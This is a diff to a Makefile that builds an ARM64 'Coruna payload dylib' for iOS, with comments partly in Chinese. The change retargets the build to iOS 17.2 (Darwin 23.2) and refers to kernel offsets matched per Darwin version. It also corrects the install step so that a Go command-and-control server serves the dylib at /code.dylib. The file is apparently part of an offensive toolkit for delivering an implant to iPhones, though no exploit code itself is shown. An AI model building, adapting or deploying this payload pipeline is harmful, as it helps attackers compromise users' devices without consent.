@@ -1,5 +1,8 @@
 # ────────────────────────────────────────────────────────────────────────────
-# Coruna iOS 13-17 payload dylib — cross-compilation Makefile
+# Coruna payload dylib — cross-compilation Makefile
+#
+# 当前以 iOS 17.2（Darwin 23.2.x）为主验证目标；如需在 iOS 13–16 上加载同一条 dylib，
+# 把 MIN_IOS 改回 13.0 再编（内核偏移仍以 offsets.c 中 Darwin 版本匹配为准）。
 #
 # Requirements (macOS only):
 #   • Xcode + iOS SDK  (xcode-select --install)
@@ -7,14 +10,14 @@
 #
 # Usage:
 #   make          → build coruna_payload.dylib (ARM64 iOS)
-#   make install  → copy to ../code..dylib  (Go C2 serve path)
+#   make install  → copy to ../code.dylib（与 Go C2 / __DS_DYLIB_NAME__ 一致）
 #   make clean    → remove build artefacts
 # ────────────────────────────────────────────────────────────────────────────
 
 CC      = clang
 ARCH    = arm64
 SDK     = $(shell xcrun --sdk iphoneos --show-sdk-path 2>/dev/null)
-MIN_IOS = 13.0
+MIN_IOS = 17.2
 TARGET  = coruna_payload.dylib
 
 # All .c files are compiled as Objective-C (they use #import / @autoreleasepool)
@@ -59,11 +62,10 @@ $(TARGET): $(OBJ)
 	$(CC) $(CFLAGS) -c $< -o $@
 
 # ── Install to Go C2 payload directory ───────────────────────────────────────
-# Copies the compiled dylib to payloads/ios1317/code..dylib
-# so the Go server can serve it at /code..dylib
+# 输出到 payloads/ios1317/code.dylib，HTTP 路径为 GET /code.dylib
 install: $(TARGET)
-	cp $(TARGET) ../code..dylib
-	@echo "Installed → ../code..dylib"
+	cp $(TARGET) ../code.dylib
+	@echo "Installed → ../code.dylib"
 
 # ── Ad-hoc codesign (optional, for testing without provisioning) ──────────────
 sign: $(TARGET)
